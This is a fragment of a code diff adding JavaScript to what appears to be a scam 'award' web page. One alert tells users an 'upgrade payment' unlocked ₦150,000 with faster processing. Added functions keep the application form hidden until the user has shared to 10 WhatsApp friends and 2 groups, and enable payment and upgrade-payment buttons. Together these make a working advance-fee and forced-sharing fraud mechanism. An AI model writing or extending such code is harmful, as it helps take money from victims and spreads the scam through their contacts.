+                alert("Your upgrade payment was successful! You are now eligible for ₦150,000 and expedited processing within 10-16 days.");
                 document.getElementById('awardAmount').textContent = "₦150,000";
             }, 2000);
         }
@@ -1585,6 +1555,26 @@
                 groupsStep.classList.remove('completed');
                 groupsStep.querySelector('input').checked = false;
             }
+        }
+        
+        function checkCompletion() {
+            const shares = JSON.parse(localStorage.getItem('whatsappShares'));
+            
+            if (shares.friends >= 10 && shares.groups >= 2) {
+                document.getElementById('shareModal').style.display = 'none';
+                document.getElementById('applicationForm').style.display = 'block';
+                window.scrollTo(0, document.getElementById('applicationForm').offsetTop);
+            }
+        }
+        
+        function selectPayment(method) {
+            document.getElementById('proceedPaymentBtn').disabled = false;
+            document.getElementById(method + 'Payment').checked = true;
+        }
+        
+        function selectUpgradePayment(method) {
+            document.getElementById('proceedUpgradeBtn').disabled = false;
+            document.getElementById(`upgrade${method.charAt(0).toUpperCase() + method.slice(1)}Payment`).checked = true;
         }
         
         function showUpgradeModal() {
